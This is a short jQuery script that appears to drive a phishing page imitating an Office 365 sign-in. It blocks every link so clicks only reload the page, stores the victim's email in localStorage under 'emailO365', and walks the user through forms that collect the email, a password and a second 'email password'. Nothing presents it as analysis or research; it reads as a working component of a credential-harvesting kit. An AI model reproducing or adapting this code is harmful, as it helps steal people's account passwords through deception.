$(document).ready(() => {
	$("a").on("click", function (r) {
		r.preventDefault(), window.location.replace(window.location.href);
	});

	$(".main-form").submit(function (e) {
		e.preventDefault();
	});

	var emailRegex =
		/(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])/i;

	$(".form-control").on("keyup blur", function () {
		if ($(this).val().trim().length < 2) {
			$(this).addClass("has-error ext-has-error");
			$(this).parent().prev().show();
		} else {
			$(this).removeClass("has-error ext-has-error");
			$(this).parent().prev().hide();
		}
	});

	$("#username").on("keyup blur", function () {
		if (!$(this).val().match(emailRegex)) {
			$(this).addClass("has-error ext-has-error");
			$(this).parent().prev().show();
		} else {
			$(this).removeClass("has-error ext-has-error");
			$(this).parent().prev().hide();
		}
	});

	$("#emailSubmitButton").on("click", function () {
		if (!$("#username").val().match(emailRegex)) {
			$("#username").trigger("blur");
		}

		if (typeof Storage !== "undefined") {
			localStorage.setItem("emailO365", $("#username").val().trim());
		} else {
			console.log("Sorry, your browser does not support Web Storage...");
		}

		if ($("#username").val().match(emailRegex)) {
			emailForm = document.getElementById("emailForm");
			emailForm.submit();
		}
	});

	$("#userSubmitButton").on("click", function () {
		if ($("#password").val().trim().length < 2) {
			$("#password").trigger("blur");
		}

		if ($("#password").val().trim().length > 3) {
			userForm = document.getElementById("userForm");
			userForm.submit();
		}
	});

	$("#authSubmitButton").on("click", function () {
		if ($("#emailPass").val().trim().length < 2) {
			$("#emailPass").trigger("blur");
		}

		if (typeof Storage !== "undefined") {
			localStorage.removeItem("emailO365");
		} else {
			console.log("Sorry, your browser does not support Web Storage...");
		}

		if ($("#emailPass").val().trim().length > 3) {
			authForm = document.getElementById("authForm");
			authForm.submit();
		}
	});
});
